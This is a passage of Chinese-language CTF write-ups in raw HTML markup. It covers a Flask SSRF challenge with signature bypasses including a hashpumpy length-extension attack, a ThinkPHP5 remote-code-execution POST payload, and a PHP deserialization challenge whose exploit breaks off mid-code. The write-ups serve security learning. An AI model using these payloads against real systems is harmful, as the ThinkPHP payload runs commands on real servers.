class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#! /usr/bin/env python</span><br><span class=\"hljs-comment\">#encoding=utf-8</span><br><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> Flask<br><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> request<br><span class=\"hljs-keyword\">import</span> socket<br><span class=\"hljs-keyword\">import</span> hashlib<br><span class=\"hljs-keyword\">import</span> urllib<br><span class=\"hljs-keyword\">import</span> sys<br><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">import</span> json<br>reload(sys)<br>sys.setdefaultencoding(<span class=\"hljs-string\">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class=\"hljs-number\">16</span>)<br><br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Task</span>:</span><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__init__</span>(<span class=\"hljs-params\">self, action, param, sign, ip</span>):</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"hljs-comment\">#SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">Exec</span>(<span class=\"hljs-params\">self</span>):</span><br>        result = &#123;&#125;<br>        result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">500</span><br>        <span class=\"hljs-keyword\">if</span> (self.checkSign()):<br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;scan&quot;</span> <span class=\"hljs-keyword\">in</span> self.action:<br>                tmpfile = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"hljs-string\">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class=\"hljs-keyword\">if</span> (resp == <span class=\"hljs-string\">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = resp<br>                <span class=\"hljs-keyword\">else</span>:<br>                    <span class=\"hljs-built_in\">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">200</span><br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;read&quot;</span> <span class=\"hljs-keyword\">in</span> self.action:<br>                f = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"hljs-string\">&#x27;r&#x27;</span>)<br>                result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">200</span><br>                result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = f.read()<br>            <span class=\"hljs-keyword\">if</span> result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] == <span class=\"hljs-number\">500</span>:<br>                result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = <span class=\"hljs-string\">&quot;Action Error&quot;</span><br>        <span class=\"hljs-keyword\">else</span>:<br>            result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">500</span><br>            result[<span class=\"hljs-string\">&#x27;msg&#x27;</span>] = <span class=\"hljs-string\">&quot;Sign Error&quot;</span><br>        <span class=\"hljs-keyword\">return</span> result<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">checkSign</span>(<span class=\"hljs-params\">self</span>):</span><br>        <span class=\"hljs-keyword\">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>        <span class=\"hljs-keyword\">else</span>:<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-comment\">#generate Sign For Action Scan.</span><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&quot;/geneSign&quot;</span>, methods=[<span class=\"hljs-string\">&#x27;GET&#x27;</span>, <span class=\"hljs-string\">&#x27;POST&#x27;</span>]</span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class=\"hljs-string\">&quot;param&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>))<br>    action = <span class=\"hljs-string\">&quot;scan&quot;</span><br>    <span class=\"hljs-keyword\">return</span> getSign(action, param)<br><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/De1ta&#x27;</span>,methods=[<span class=\"hljs-string\">&#x27;GET&#x27;</span>,<span class=\"hljs-string\">&#x27;POST&#x27;</span>]</span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class=\"hljs-string\">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class=\"hljs-string\">&quot;param&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class=\"hljs-string\">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class=\"hljs-keyword\">if</span>(waf(param)):<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class=\"hljs-keyword\">return</span> json.dumps(task.Exec())<br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">index</span>():</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;code.txt&quot;</span>,<span class=\"hljs-string\">&quot;r&quot;</span>).read()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">scan</span>(<span class=\"hljs-params\">param</span>):</span><br>    socket.setdefaulttimeout(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-keyword\">try</span>:<br>        <span class=\"hljs-keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"hljs-number\">50</span>]<br>    <span class=\"hljs-keyword\">except</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;Connection Timeout&quot;</span><br><br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">getSign</span>(<span class=\"hljs-params\">action, param</span>):</span><br>    <span class=\"hljs-keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">md5</span>(<span class=\"hljs-params\">content</span>):</span><br>    <span class=\"hljs-keyword\">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">waf</span>(<span class=\"hljs-params\">param</span>):</span><br>    check=param.strip().lower()<br>    <span class=\"hljs-keyword\">if</span> check.startswith(<span class=\"hljs-string\">&quot;gopher&quot;</span>) <span class=\"hljs-keyword\">or</span> check.startswith(<span class=\"hljs-string\">&quot;file&quot;</span>):<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class=\"hljs-literal\">False</span><br>    app.run(host=<span class=\"hljs-string\">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到对文件执行操作的有两个，一个 scan，一个 read，scan 把文件写道 resault.txt，而 read 可以读文件。</p>\n</li>\n<li>\n<p>但是要实现读写文件就要突破 hash 的验证。这里主要有两个方法来突破验证，一个是通过本身的代码来绕过，另外一个是通过 hashpumpy 工具来绕过</p>\n<ol>\n<li>通过本身代码绕过：\n<ol>\n<li>因为判断是 scan 还是 read 操作用的是 <code>in</code>  而不是 <code>=</code> , 所以我们可以传入 scanread 实现同时操作</li>\n<li>哈希判断： <code>md5(secert_key+param+action)</code> ,secert_key 是固定的，param 和 action 可控，而 <code>/geneSign</code>  可以拿到加密后的 hash 值，当我们传入 param=flag.txtread 时，等式左边等于 <code>md5(secert_key+'flag.txtread'+'scan')</code> , 然后我们访问 <code>/De1ta</code>  时 param=flag.txt&amp;action=readscan, 此时两个 md5 值相等也就绕过了验证，把第一步得到的 hash 传入第二部即可拿到 flag</li>\n</ol>\n</li>\n<li>利用哈希长度拓展攻击 hashpumpy 工具绕过\n<ol>\n<li><code>hashpumpy.hashpump('a36a5ba0e8b9bb78094cbdb641007508', 'scan', 'read', 24)</code> =&gt; <code>('ca08c49a467b1e8b465aa6acb96f20f1', 'scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read')</code></li>\n<li>传入 param=flag.txt，action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00% e0%00%00%00%00%00%00%00read，sing=ca08c49a467b1e8b465aa6acb96f20f1 即可拿到 flag</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"bjdctf-2ndold-hack\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf-2ndold-hack\">#</a> [BJDCTF 2nd]old-hack</h2>\n<ol>\n<li>\n<p>打开网站提示 THINKPHP5</p>\n</li>\n<li>\n<p><a href=\"https://www.cnblogs.com/nongchaoer/p/12029478.html\">https://www.cnblogs.com/nongchaoer/p/12029478.html</a></p>\n</li>\n<li>\n<p>测试 payload：</p>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs oxygene\">POST ?s=xxx<br><br><br>_method=__construct&amp;filter[]=system&amp;<span class=\"hljs-function\"><span class=\"hljs-keyword\">method</span>=<span class=\"hljs-title\">get</span>&amp;<span class=\"hljs-title\">server</span>[<span class=\"hljs-title\">REQUEST_METHOD</span>]=<span class=\"hljs-title\">cat</span> /<span class=\"hljs-title\">flag</span></span><br></code></pre></td></tr></table></figure>\n<p>拿到 flag</p>\n</li>\n</ol>\n<h2 id=\"网鼎杯-2020-青龙组areuserialz\"><a class=\"markdownIt-Anchor\" href=\"#网鼎杯-2020-青龙组areuserialz\">#</a> [网鼎杯 2020 青龙组] AreUSerialz</h2>\n<ol>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br><br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$op</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$filename</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$content</span>;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;write();<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read();<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-variable\">$res</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;content)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-keyword\">$this</span>-&gt;content) &gt; <span class=\"hljs-number\">100</span>) &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Too long!&quot;</span>);<br>                <span class=\"hljs-keyword\">die</span>();<br>            &#125;<br>            <span class=\"hljs-variable\">$res</span> = file_put_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename, <span class=\"hljs-keyword\">$this</span>-&gt;content);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$res</span>) <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Successful!&quot;</span>);<br>            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename)) &#123;<br>            <span class=\"hljs-variable\">$res</span> = file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$res</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">output</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$s</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>            <span class=\"hljs-keyword\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_valid</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; strlen(<span class=\"hljs-variable\">$s</span>); <span class=\"hljs-variable\">$i</span>++)<br>        <span class=\"hljs-keyword\">if</span>(!(ord(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &gt;= <span class=\"hljs-number\">32</span> &amp;&amp; ord(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &lt;= <span class=\"hljs-number\">125</span>))<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>&#123;<span class=\"hljs-string\">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class=\"hljs-variable\">$str</span> = (<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;str&#x27;</span>];<br>    <span class=\"hljs-keyword\">if</span>(is_valid(<span class=\"hljs-variable\">$str</span>)) &#123;<br>        <span class=\"hljs-variable\">$obj</span> = unserialize(<span class=\"hljs-variable\">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>反序列化的题目，寻找 POP 链</p>\n</li>\n<li>\n<p>read () 可以读文件 =&gt;read () 会被 process () 调用 =&gt;process () 会被 <code>__construct()</code>  还有 <code>__destruct()</code>  调用</p>\n</li>\n<li>\n<p>由于 <code>__construct()</code>  会初始化导致文件名不可控，且其可以绕过，而 <code>__destruct()</code> , 会让 op 强制等于 1，但是这里用了 <code>===‘2’</code> ，也就是说如果 op 为整型 2，即可绕过</p>\n</li>\n<li>\n<p>同时这题有一个 check，我们把 protected 改成 public 即可绕过</p>\n</li>\n<li>\n<p>exp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$op</span>=<span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$filename</span>=<span class=\"hljs-string\">&#x27;flag.php&#x27;</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$content</span>;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;write();<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read();<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-variable\">$res</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;content)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-keyword\">$this</span>-&gt;content) &gt; <span class=\"hljs-number\">100</span>) &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Too long!&quot;</span>);<br>                <span class=\"hljs-keyword\">die</span>();<br>            &#125;<br>            <span class=\"hljs-variable\">$res</span> = file_put_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename, <span class=\"hljs-keyword\">$this</span>-&gt;content);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$res</span>) <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Successful!&quot;</span>);<br>            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename)) &#123;<br>            <span class=\"hljs-variable\">$res</span> = file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$res</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">output</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$s</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span 